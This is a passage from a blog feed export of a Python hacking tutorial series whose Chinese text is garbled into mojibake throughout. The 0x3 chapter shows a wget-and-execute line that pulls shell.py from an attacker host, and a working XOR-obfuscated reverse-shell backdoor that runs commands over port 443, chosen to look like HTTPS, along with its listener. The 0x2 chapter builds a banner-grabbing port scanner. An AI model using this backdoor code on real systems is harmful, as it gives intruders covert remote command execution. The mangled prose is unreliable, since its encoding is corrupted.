æ¼”ç¤ºäº†ä¸€ä¸ªåŸºæœ¬çš„Fuzzæµ‹è¯•è„šæœ¬ï¼Œä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯æ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œæäº¤<code>\x41</code>å­—ç¬¦å¯èƒ½ä¸ä¼šè®©ä½ æˆåŠŸçš„æ‹¿ä¸‹å—å®³ä¸»æœºï¼Œä½†æ˜¯ä½ å¯ä»¥å°è¯•ç»„åˆä¸€äº›å…¶ä»–çš„å­—ç¬¦(ç”¨æˆ·è¯å…¸).æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªæ›´åŠ å¼ºå¤§çš„Fuzzæµ‹è¯•å·¥å…·<a href="https://www.blackhat.com/presentations/bh-usa-02/bh-us-02-aitel-spike.ppt" target="_blank" rel="noopener">Spike</a>å’Œ<a href="http://resources.infosecinstitute.com/intro-to-fuzzing/" target="_blank" rel="noopener">å…·ä½“ä»‹ç»ä¸æ¼”ç¤º</a>,å®ƒå¯ä»¥ä¸€æ¬¡æ€§çš„æµ‹è¯•å¤§é‡æ•°æ®ï¼Œå¹¶ä¸”èƒ½è®©ä½ æé«˜æˆåŠŸæ¦‚ç‡.</p></blockquote><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>å¤§å®¶å¯ä»¥æŠŠä¸Šé¢çš„<code>ftp</code>æµ‹è¯•æ¢æˆ<code>http</code>æµ‹è¯•ï¼Œè¿™é‡Œæç¤º:ä½ å¯èƒ½éœ€è¦ä½¿ç”¨<code>httplib/urllib</code>.ä¸‹ä¸€ç« </p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythoné»‘å®¢ä¹‹æ—…0x3</title>
      <link href="/2015/10/15/pythonhacker_0x3/"/>
      <url>/2015/10/15/pythonhacker_0x3/</url>
      <content type="html"><![CDATA[<h2 id="åå‘shell"><a href="#åå‘shell" class="headerlink" title="åå‘shell"></a>åå‘shell</h2><a id="more"></a><p>å‚è€ƒé˜…è¯»:<a href="http://os.51cto.com/art/201312/424378.htm" target="_blank" rel="noopener">ä»€ä¹ˆæ˜¯åå‘Shell</a></p><p>è¿™ç¯‡æ•™ç¨‹å°†ä¼šæ•™ä½ ä½¿ç”¨Pythonç¼–å†™ä¸€ä¸ªåå‘shellï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæ¼”ç¤ºä½¿ç”¨Pythonå¦‚ä½•åˆ©ç”¨webæœåŠ¡å™¨çš„åŠŸèƒ½ï¼ŒæŠŠæ–‡ä»¶ä»å¦ä¸€å°ä¸»æœºä¼ é€è¿‡æ¥ã€‚æˆ‘ä»¬å‡è®¾ä½ æœ‰ä¸€å°å‚€å„¡ä¸»æœºï¼Œä½ ç°åœ¨æƒ³ä¸‹è½½å‚€å„¡æœºä¸Šé¢çš„çš„æ–‡ä»¶ã€‚é‚£ä¹ˆä½ å°±å¯ä»¥ä½¿ç”¨shell(æˆ–meterpreter)å»è®¿é—®è¿™å°å‚€å„¡æœºï¼Œä½ å¯ä»¥é€šè¿‡ä¸€è¡ŒPythonä»£ç æŠŠå‚€å„¡æœºå»ºç«‹æˆä¸ºä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œç„¶åä¸‹è½½å‚€å„¡æœºä¸Šé¢çš„æ–‡ä»¶.</p><p>åˆ›å»ºä¸€ä¸ªpython HTTPæœåŠ¡å™¨å¯ä»¥ç›´æ¥ä½¿ç”¨pythonçš„å†…å»ºå‡½æ•°â€SimpleHTTPServerâ€æ¥åˆ›å»ºï¼Œä½ å¯ä»¥ä½¿ç”¨â€™-mâ€™å‚æ•°ç›´æ¥åœ¨å‘½ä»¤è¡Œè°ƒç”¨æ¨¡å—ï¼Œåˆ›å»ºçš„æœåŠ¡å™¨é»˜è®¤æ˜¯ç›‘å¬çš„8000ç«¯å£ï¼Œä½†æ˜¯ä½ å¯ä»¥æŒ‡å®šç«¯å£ï¼Œç›´æ¥åœ¨â€™SimpleHTTPServerâ€™åé¢è·Ÿä¸€ä¸ªç«¯å£å‚æ•°:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">python -m SimpleHTTPServer <span class="number">80</span></div><div class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">80</span> ...</div></pre></div></div></figure><p>æˆ‘ä»¬å‡è®¾ä½ æ²¡æœ‰é˜²ç«å¢™å»é˜»æ­¢ä½ çš„è¿æ¥ï¼Œé‚£ä¹ˆä½ æ˜¯å¯ä»¥è¯·æ±‚åˆ°è¿™æœåŠ¡å™¨çš„æ•°æ®ã€‚ä½ å¯ä»¥åœ¨ä»»ä½•ç›®å½•é‡Œé¢å»å¯åŠ¨Python HTTPæœåŠ¡å™¨ï¼Œè¿™æ ·ä½ å°±èƒ½å¤Ÿé€šè¿‡æµè§ˆå™¨æˆ–è€…æ˜¯è¿œç¨‹å®¢æˆ·ç«¯æ¥è®¿é—®è¿™ä¸ªç›®å½•ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç®€å•çš„ä¾‹å­å‘Šè¯‰ä½ ä½¿ç”¨wgetå·¥å…·å»è·å–æ–‡ä»¶,ä½†æ˜¯æœ‰äº›æ—¶å€™å°±ä¼šç»å¸¸å‘ç°ä½ æ ¹æœ¬æ²¡æœ‰æƒé™åœ¨å½“å‰ç›®å½•å†™å…¥æ–‡ä»¶å¹¶ä¸”åˆå§‹åŒ–è¿™ä¸ªè„šæœ¬ï¼Œä½†æ˜¯ä½ å¯ä»¥æ”¹å˜è„šæœ¬æ‰§è¡Œçš„ç›®å½•ï¼Œä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ¼”ç¤ºäº†æŠŠè„šæœ¬åœ¨/tmpç›®å½•ä¸‹é¢æ‰§è¡Œï¼š</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#ä½¿ç”¨-Oå‚æ•°ï¼ŒæŠŠæ–‡ä»¶ä¿å­˜åœ¨å…¶ä»–ç›®å½•- /tmp/ ä¸€èˆ¬å¯å†™</span></div><div class="line">wget -O /tmp/shell.py http://&lt;attacker_ip&gt;/shell.py</div><div class="line"> </div><div class="line"><span class="comment">#ä¿®æ”¹æƒé™</span></div><div class="line">chmod a+x /tmp/shell.py</div><div class="line"> </div><div class="line"><span class="comment"># ä½¿ç”¨fileå‘½ä»¤æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æ­£ç¡®</span></div><div class="line">file /tmp/shell.py</div><div class="line"> </div><div class="line"><span class="comment">#æ‰§è¡Œè„šæœ¬</span></div><div class="line">/usr/bin/python /tmp/shell.py</div></pre></div></div></figure><h2 id="å®¢æˆ·ç«¯åå‘shellä»£ç "><a href="#å®¢æˆ·ç«¯åå‘shellä»£ç " class="headerlink" title="å®¢æˆ·ç«¯åå‘shellä»£ç "></a>å®¢æˆ·ç«¯åå‘shellä»£ç </h2><p>é˜…è¯»ä¸‹é¢çš„åé—¨ä»£ç ã€‚ç¼–ç æ—¶ä¼šä½¿ç”¨åˆ°<code>socket</code>ï¼Œ<code>subprocess</code>å’Œ<code>sys</code>æ¨¡å—ï¼Œé€‰æ‹©<code>subprocess</code>æ¨¡å—åŸå› ï¼Œæ˜¯å› ä¸ºå®ƒå…è®¸ä½¿ç”¨ä¸€ä¸ªå˜é‡å‚¨å­˜STDOUTè¾“å‡ºçš„ç»“æœï¼Œä¹‹åå¯ä»¥åœ¨ä»£ç ä¸­çš„å…¶ä»–éƒ¨åˆ†é€šè¿‡è°ƒç”¨æ­¤å˜é‡è®¿é—®ä¿å­˜çš„STDOUTæ•°æ®ã€‚ä¸‹é¢çš„ä»£ç ä¸­ï¼šæ‰€å»ºç«‹çš„è¿æ¥ä¼šç›‘å¬<code>443</code>ç«¯å£ã€‚<code>443</code>ç«¯å£ç»å¸¸ç”¨åœ¨<strong>https</strong>ä¸Šï¼Œè¿™é‡Œä½¿ç”¨<code>443</code>ç«¯å£å¯ä»¥èµ·åˆ°æ··æ·†è§†å¬çš„ä½œç”¨:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"> </div><div class="line"><span class="keyword">import</span> socket,subprocess,sys</div><div class="line"> </div><div class="line">RHOST = sys.argv[<span class="number">1</span>]</div><div class="line">RPORT = <span class="number">443</span></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((RHOST, RPORT))</div><div class="line"> </div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">     <span class="comment"># ä»socketä¸­æ¥æ”¶XORç¼–ç çš„æ•°æ®</span></div><div class="line">     data = s.recv(<span class="number">1024</span>)</div><div class="line"> </div><div class="line">     <span class="comment"># XOR the data again with a '\x41' to get back to normal data</span></div><div class="line">     en_data = bytearray(data)</div><div class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_data)):</div><div class="line">       en_data[i] ^=<span class="number">0x41</span></div><div class="line"> </div><div class="line">     <span class="comment"># æ‰§è¡Œè§£ç å‘½ä»¤ï¼Œsubprocessæ¨¡å—èƒ½å¤Ÿé€šè¿‡PIPE STDOUT/STDERR/STDINæŠŠå€¼èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡</span></div><div class="line">     comm = subprocess.Popen(str(en_data), shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</div><div class="line">     comm.wait()</div><div class="line">     STDOUT, STDERR = comm.communicate()</div><div class="line"> </div><div class="line">     <span class="comment"># è¾“å‡ºç¼–ç åçš„æ•°æ®å¹¶ä¸”å‘é€ç»™æŒ‡å®šçš„ä¸»æœºRHOST</span></div><div class="line">     en_STDOUT = bytearray(STDOUT)</div><div class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_STDOUT)):</div><div class="line">       en_STDOUT[i] ^=<span class="number">0x41</span></div><div class="line">     s.send(en_STDOUT)</div><div class="line">s.close()</div></pre></div></div></figure><p>ä¸Šé¢çš„ä»£ç ä¸­æœ‰äº›æ¦‚å¿µå·²ç»åœ¨<a href="http://www.kionf.com/python/2015/10/14/pythonhacker_0x2.html" target="_blank" rel="noopener">0x2</a>ä»‹ç»è¿‡äº†ï¼Œä½†æ˜¯é™¤äº†ä¹‹å‰çš„ä½¿ç”¨socketåˆ›å»ºä¸€ä¸ªè¿æ¥ä¹‹å¤–ï¼Œæˆ‘ä»¬é€šè¿‡subprocessæ¨¡å—æ‰§è¡Œäº†ä¸€ä¸ªå‘½ä»¤ï¼Œ<code>subprocess</code>æ¨¡å—éå¸¸çš„æ–¹ä¾¿ï¼Œå®ƒå…è®¸ä½ é€šè¿‡STDOUT/STDERRå‘½ä»¤ç›´æ¥æŠŠå€¼èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤æŠŠè¾“å‡ºçš„è¿›è¡Œç¼–ç ç„¶åé€šè¿‡socketç½‘ç»œå‘é€å‡ºå»ã€‚</p><p>ä½¿ç”¨OXRçš„å¥½å¤„å°±æ˜¯ä½ èƒ½å¤Ÿå¾ˆå®¹æ˜“ç¼–ç ä½ è¦å‘é€è¿‡å»çš„æ•°æ®ï¼Œç„¶åé€šè¿‡ç›¸åŒçš„å¯†é’¥æ¥è§£ç è¿”å›çš„æ•°æ®ï¼Œæœ€åè§£ç åçš„æ•°æ®å¯ä»¥ä»¥æ˜æ–‡çš„å½¢å¼å»æ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="æœåŠ¡ç«¯ç›‘å¬shellä»£ç "><a href="#æœåŠ¡ç«¯ç›‘å¬shellä»£ç " class="headerlink" title="æœåŠ¡ç«¯ç›‘å¬shellä»£ç "></a>æœåŠ¡ç«¯ç›‘å¬shellä»£ç </h2><p>ç°åœ¨ä¸ºäº†åˆ©ç”¨å¥½è¿™ä¸ªåé—¨ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç›‘å¬è„šæœ¬å¹¶ä¸”è§£ç åç«¯ä¼ è¾“è¿‡æ¥çš„æ•°æ®ï¼Œè®©æˆ‘ä»¬é€šè¿‡æ˜æ–‡å¾ˆæ¸…æ™°çš„çœ‹æ¸…æ¥šè¿”å›çš„æ•°æ®ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å°†è¦è®¾è®¡ä¸€ä¸ªç›‘å¬å™¨ã€‚æ¥è·å–åå‘shellçš„æ•°æ®ï¼Œå¹¶ä¸”èƒ½å¤Ÿå¯¹äºè¾“å…¥ï¼è¾“å‡ºçš„è¿›è¡Œè§£ç /ç¼–ç ï¼Œä¸ºäº†èƒ½å¤Ÿåœ¨ç»ˆç«¯ä¸Šé¢èƒ½å¤Ÿå¾ˆæ¸…æ™°çš„çœ‹å‡ºæ¥ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨XORç¼–ç :</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">import</span> socket </div><div class="line"></div><div class="line">s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.bind((<span class="string">"0.0.0.0"</span>, <span class="number">443</span>))</div><div class="line">s.listen(<span class="number">2</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"Listening on port 443... "</span></div><div class="line">(client, (ip, port)) = s.accept()</div><div class="line"><span class="keyword">print</span> <span class="string">" Received connection from : "</span>, ip</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"> command = raw_input(<span class="string">'~$ '</span>)</div><div class="line"> encode = bytearray(command)</div><div class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(encode)):</div><div class="line">   encode[i] ^=<span class="number">0x41</span></div><div class="line"> client.send(encode)</div><div class="line"> en_data=client.recv(<span class="number">2048</span>)</div><div class="line"> decode = bytearray(en_data)</div><div class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(decode)):</div><div class="line">   decode[i] ^=<span class="number">0x41</span></div><div class="line"> <span class="keyword">print</span> decode</div><div class="line"> </div><div class="line">client.close()</div><div class="line">s.close()</div></pre></div></div></figure><blockquote><p>è¿™ç« çš„ä¾‹å­éå¸¸æœ‰è¶£ï¼Œå¯¹äºå­¦ä¹ ä¿¡æ¯å®‰å…¨çš„æœ‹å‹éƒ½å–œæ¬¢shellï¼Œå¤§å®¶å¯ä»¥å¯¹ä»£ç åšç‚¹ä¿®æ”¹è®©è¿™ä¸ªè„šæœ¬ä¹Ÿèƒ½å¤Ÿåœ¨windowä¸Šé¢ä¹Ÿèƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œæœ€åå¤§å®¶å¯ä»¥ä½¿ç”¨<code>base64</code>æ¥ä»£æ›¿XORè¿›è¡Œç¼–ç ä¸è§£ç ï¼Œè¿™äº›ç»ƒä¹ è®©ä½ ä½ æ›´åŠ ç†Ÿç»ƒçš„ä½¿ç”¨python.ä¸‹ä¸€ç« </p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythoné»‘å®¢ä¹‹æ—…0x2</title>
      <link href="/2015/10/14/pythonhacker_0x2/"/>
      <url>/2015/10/14/pythonhacker_0x2/</url>
      <content type="html"><![CDATA[<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>è¿™ä¸€ç« å°†ä¼šæ¼”ç¤ºå¦‚ä½•é€šè¿‡Pythonçš„ç½‘ç»œè¿æ¥æ¥å¼€å‘ä¸€ä¸ªåŸºç¡€çš„ç«¯å£æ‰«æå™¨,æˆ‘ä»¬çš„è®¾è®¡æ€è·¯æ˜¯ä½¿ç”¨socketä¸€éåˆä¸€éçš„å»è¿æ¥ipä¸ç«¯å£çš„ç»„åˆçš„æ–°å€¼,ä¸ºäº†æ–¹é¢æˆ‘ä»¬èƒ½å¤Ÿå¿«é€Ÿçš„å®Œæˆå®ƒï¼Œé¦–å…ˆéœ€è¦ä»‹ç»ä¸€ç‚¹æ–°çš„æ¦‚å¿µ,forå¾ªç¯:</p><a id="more"></a><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1024</span>):</div><div class="line"><span class="meta">... </span>  <span class="keyword">print</span> <span class="string">"[+] The port is: "</span>+str(port)</div><div class="line">...</div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1000</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1001</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1002</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1003</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1004</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1005</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1006</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1007</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1008</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1009</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1010</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1011</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1012</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1013</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1014</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1015</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1016</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1017</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1018</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1019</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1020</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1021</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1022</span></div><div class="line">[+] The port <span class="keyword">is</span>: <span class="number">1023</span></div></pre></div></div></figure><p>æ³¨æ„ä¸Šé¢é‚£æ®µä»£ç åœ¨å¾ªç¯ä½“å†…çš„ç¼©è¿›ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯ç©ºä¸¤æ ¼æˆ–ä¸€ä¸ªtabé”®ï¼Œä½†è¿™éƒ½æ²¡æœ‰å…³ç³»ï¼Œåªè¦ä½ çš„æ•´ä¸ªä»£ç ä¸€ç›´å°±å¯ä»¥äº†ã€‚æˆ‘ä¹ˆæ‰€å†™çš„é‚£ä¸ªç®€çŸ­çš„ç«¯å£æ‰«æå™¨çš„æ ¸å¿ƒä»£ç ä¼šå†™åœ¨ä¸Šé¢ä»£ç ä¸­çš„è¾“å‡ºå—éƒ¨åˆ†ï¼Œç„¶åå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ã€‚ä¸‹é¢çš„ä»£ç å°±æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨å†…å»ºçš„socketæ¨¡å—å»å»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼š</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.connect((<span class="string">'127.0.0.1s'</span>, <span class="number">22</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.send(<span class="string">'Primal Security \n'</span>)</div><div class="line"><span class="number">17</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>banner = s.recv(<span class="number">1024</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> banner</div><div class="line">OpenSSH</div></pre></div></div></figure><p>ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼šæˆ‘ä»¬å…ˆimportè¿™socketæ¨¡å—å¹¶ä¸”è°ƒç”¨connect()å‡½æ•°å»è¿æ¥æŒ‡å®šçš„IPåœ°å€ä¸ç«¯å£ã€‚å®ƒå°±ä¼šå»ºç«‹ä¸€ä¸ªTCPè¿æ¥(SYN/SYN-ACK/ACK)å¹¶ä¸”æˆ‘ä»¬å†é€šè¿‡send()å‡½æ•°ç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªçœŸå®çš„æ•°æ®ï¼Œç„¶åä½¿ç”¨recv()æ‰“å°å‡ºå“åº”çš„å†…å®¹ã€‚ç°åœ¨æ•™å¤§å®¶å¦‚ä½•å®¹é”™socketï¼Œå¯¹äºä¸èƒ½æ‰“å¼€çš„è¿æ¥:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">23</span>))</div><div class="line">Traceback (most recent call last):</div><div class="line">  File "&lt;stdin&gt;", line 1, in ?</div><div class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> connect</div><div class="line">socket.error: (<span class="number">111</span>, <span class="string">'Connection refused'</span>)</div></pre></div></div></figure><p>å¯¹äºä¸Šé¢çš„é”™è¯¯æœ‰è‹¥å¹²ä¸­å¤„ç†æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æœ€ç®€å•çš„ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨<code>try/except</code>å¾ªç¯æ¥å¤„ç†é”™è¯¯:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">try</span>:</div><div class="line"><span class="meta">... </span>  s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">23</span>))</div><div class="line"><span class="meta">... </span><span class="keyword">except</span>: <span class="keyword">pass</span></div><div class="line">...</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>ç°åœ¨å°±ä¸ä¼šå‡ºç°é”™è¯¯äº†ï¼Œä¸€è¡Œå¾ˆç®€å•çš„ä»£ç å°±è®©ä½ çš„ç¨‹åºèƒ½å¤Ÿç»§ç»­å·¥ä½œä¸‹å»^_^ã€‚ç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨ä¹‹å‰å­¦åˆ°çš„çŸ¥è¯†ï¼Œä½¿ç”¨forå¾ªç¯æ¥å†™ä¸€ä¸ªç®€å•çš„ç«¯å£æ‰«æå™¨:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">25</span>):</div><div class="line"><span class="meta">... </span>  <span class="keyword">try</span>:</div><div class="line"><span class="meta">... </span>   <span class="keyword">print</span> <span class="string">"[+] Attempting to connect to 127.0.0.1:"</span>+str(port)</div><div class="line"><span class="meta">... </span>    s.connect((<span class="string">'127.0.0.1'</span>, port))</div><div class="line"><span class="meta">... </span>    s.send(<span class="string">'Primal Security \n'</span>)    </div><div class="line"><span class="meta">... </span>    banner = s.recv(<span class="number">1024</span>)</div><div class="line"><span class="meta">... </span>    <span class="keyword">if</span> banner:</div><div class="line"><span class="meta">... </span>      <span class="keyword">print</span> <span class="string">"[+] Port "</span>+str(port)+<span class="string">" open: "</span>+banner</div><div class="line"><span class="meta">... </span>    s.close()</div><div class="line"><span class="meta">... </span>  <span class="keyword">except</span>: <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="number">17</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">20</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">21</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span></div><div class="line">[+] Port <span class="number">22</span> open: OpenSSH</div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">23</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">24</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">25</span></div></pre></div></div></figure><p>ä¸Šé¢æˆ‘ä»¬æ¼”ç¤ºäº†ä½¿ç”¨<code>try/except</code>å¾ªç¯æ¥å¤„ç†å½“socketè¿æ¥çš„æ—¶å€™é‡åˆ°ç«¯å£å…³é—­çš„é”™è¯¯ï¼ŒåŒæ—¶ä¸Šé¢è¿˜æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨â€ifâ€è¯­å¥æ‰“å°å‡ºå¯ä»¥è¿æ¥æˆåŠŸçš„ç«¯å£ã€‚ä¸‹é¢æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬æ‰«ææŒ‡å®šç«¯å£çš„æ‰«æå™¨ï¼Œè¿™é‡Œçš„ç«¯å£å·ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•°ç»„æ¥å­˜å‚¨ï¼Œç„¶åéå†è¿™ä¸€ä¸ªæ•°ç»„:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ports = [<span class="number">22</span>, <span class="number">445</span>, <span class="number">80</span>, <span class="number">443</span>, <span class="number">3389</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="meta">... </span>  <span class="keyword">print</span> port</div><div class="line">...</div><div class="line"><span class="number">22</span></div><div class="line"><span class="number">445</span></div><div class="line"><span class="number">80</span></div><div class="line"><span class="number">443</span></div><div class="line"><span class="number">3389</span></div><div 